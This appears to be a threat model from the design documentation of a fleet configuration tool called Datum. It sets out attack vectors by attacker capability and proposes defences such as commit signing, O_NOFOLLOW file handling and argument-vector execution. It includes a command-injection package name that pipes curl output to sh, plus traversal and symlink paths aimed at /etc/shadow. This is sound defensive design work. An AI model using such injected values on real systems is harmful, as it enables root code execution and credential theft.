# Threat model

Vectors are grouped by what the attacker can already do, because that is what decides which
controls are available. Each one records the impact and the design's position, using the
labels from [project status](../introduction/project-status.md).

## An attacker who can merge to the repository

**Arbitrary root execution across the fleet.** A merged change reaches every host it matches,
applied by an agent running as root. No further control sits between the merge and the host.

Mitigation is entirely outside Datum, being branch protection, required review, and restricting who
can approve. The design's contribution is that the change is a readable diff of declared state, not
a script, so review has something reviewable, and that provenance makes it possible to ask
afterwards which layer introduced a value.

**A commit that never went through review.** Whoever controls the Git remote, or an attacker
holding an account on the Git server with push rights, can place a commit on the tracked branch directly.
Transport authentication does not help, because the commit arrives over a legitimate
connection.

!!! note "Proposed behaviour"

    Commit signature verification on the agent would move trust from the Git server to a key. The
    agent holds a set of trusted public keys and refuses to resolve a revision that is not
    signed by one of them. This is the single most valuable control not yet designed, because
    it is the only one that constrains the repository writer.

**Replaying an old revision.** A valid, signed, older commit reintroduces a vulnerability that
was fixed. Signature verification alone does not catch this, because the old commit is
genuinely signed.

!!! note "Proposed behaviour"

    The agent can require each revision it applies to be a descendant of the one it last
    applied, refusing anything that is not a fast-forward. That uses Git's own history rather
    than adding a counter, and it means a legitimate revert has to be a new commit rather than
    a reset, which is the desired workflow anyway.

## An attacker who can read the repository

**Fleet-wide configuration disclosure.** Reading the repository reveals the configuration of
every host, including file contents, package sets, user accounts and the structure of the
estate.

Every managed host has this capability, so compromising the least important machine in the fleet
discloses the configuration of the most important one.

**Credential theft from a host.** The repository credential sits on disk on every host. Stealing
one from anywhere grants repository read access from anywhere.

!!! note "Open question"

    Per-host, read-only, individually revocable credentials would limit this, and nothing about
    how credentials are provisioned or rotated has been designed.

## An attacker with root on one managed host

**Lying about observed state.** The agent runs on the host, so it can report anything. Datum
will then apply changes that are not needed or skip changes that are.

The impact is bounded to that machine, and the important consequence is for reporting, not for
configuration. A converged status from a host is a claim made by that host, so a green fleet report
is not evidence of compliance. Treating it as an attestation would be wrong, and no part of the
design attempts to make it one.

**Preventing reconciliation.** Stopping the agent, blocking its network access or corrupting its
configuration all stop that host converging. Detection depends on noticing the absence of reports
instead of receiving a bad one, which is a monitoring property Datum does not currently provide.

**Claiming another host's identity.** This gains nothing, because the host already reads the
whole repository. Identity selects which configuration to apply and grants no access.

## An attacker with an unprivileged account on a managed host

This position is the most frequently overlooked, and it is where a root-privileged agent is most
dangerous. Every item here is a requirement on providers, not a design position.

**Symlink substitution at a managed path.** Datum writes a file as root. An unprivileged user who
can create entries in the target directory replaces the target with a symlink to `/etc/shadow`,
and root follows it.

The directory does not have to be world-writable for this to matter. Any path under a directory
owned by a service account, which is common under `/var/lib` and `/srv`, is reachable by whoever
controls that account.

!!! note "Proposed behaviour"

    A `File` provider opens the final path component with `O_NOFOLLOW`, creates its temporary
    file in the target directory with `O_CREAT` and `O_EXCL`, sets ownership and mode on the
    file descriptor rather than on the path, and renames into place. Resolving the parent
    directory by walking it component by component and holding a directory descriptor, rather
    than re-resolving a string at each step, closes the case where a directory is swapped
    during the walk.

**Substitution between observation and apply.** Observation reads a path and the planner decides
an update is needed. The path is replaced before the reconciler writes.

Verification detects this after the fact, because the affected resource is read again and will
not match. Detection is weaker than prevention, and saying so is more useful than implying the
race is closed. Operating on a directory descriptor captured during observation rather than on a
path string narrows the window considerably.

**Hard links to files the attacker cannot read.** An unprivileged user creates a hard link, in a
directory they control, to a file they have no access to. A `File` or `Directory` resource that
then changes ownership or mode on that path grants them access to the original.

!!! note "Proposed behaviour"

    Refuse to change ownership or mode on a path whose link count is greater than one unless the
    resource is also managing its content, and report it rather than proceeding.

**Reading reports and plans.** A plan can contain file content, and a report written
world-readable hands it to any local user.

!!! note "Proposed behaviour"

    Reports are owned by root with mode `0600`, and content differences are recorded as digests
    by default rather than as text. Rendering readable content is something a command does on
    request, not something written to disk automatically.

## An attacker who controls resource field values

This overlaps with repository write access and is listed separately because the controls are
implementation rules, not process.

**Command injection through a field.** A package name of `nginx; curl http://host/x | sh` reaches
a provider. If the provider builds a shell string, that runs as root.

!!! note "Proposed behaviour"

    Providers invoke an argument vector directly and never construct a shell command line, so
    field values cannot be interpreted as syntax. Nothing above the provider boundary passes
    user-controlled data through a shell either, because there is no shell there at all.

**Field values that are syntactically valid and semantically wrong.** A package name containing a
path separator, a unit name containing a slash, or a sysctl key containing `..` can reach tooling
that interprets them.

!!! note "Proposed behaviour"

    Each resource type validates the syntax of its identifying fields before a provider sees
    them. Paths must be absolute, package and unit and account names must match a restrictive
    pattern, and a value failing validation is a manifest error rather than a provider failure.

**Path traversal through a content source.** A `File.desired.source` of `../../../../etc/shadow`
would read outside the repository and write its contents to a host.

!!! note "Proposed behaviour"

    A source path resolves relative to its layer directory and the result must remain inside the
    fleet root, with symbolic links inside the repository not followed outside it. This matters
    most where a repository has path-based ownership and a contributor can write one subdirectory
    without being trusted with the rest.

## An attacker on the network

**Interception between agent and Git remote.** Mitigated by transport authentication, which the
design assumes is working. Commit signature verification would make interception insufficient on
its own, because modified content would not verify.

## An attacker who controls upstream content

**A package repository Datum was told to trust.** A `File` resource writing a sources list adds a
third-party repository, after which the package manager installs and trusts whatever it serves.
The result is root execution, arranged entirely through a legitimate-looking configuration file.

This needs stating because adding a repository looks like an ordinary file change in review. It is
also the main security consideration behind a future `Repository` resource type, which would at
least make the intent explicit and reviewable as its own thing instead of as a file containing a
URL.

**Package content itself.** Signature verification is the distribution's, not Datum's. A
repository whose signing key is configured and trusted produces packages Datum installs without
further question.

## Not modelled

Denial of service against a host by its own configuration is not treated as an attack. A matcher
that accidentally matches every host and declares a critical package absent will remove it
everywhere, and that is a blast radius problem, not a security boundary.

Side channels, physical access and hypervisor-level compromise are out of scope.
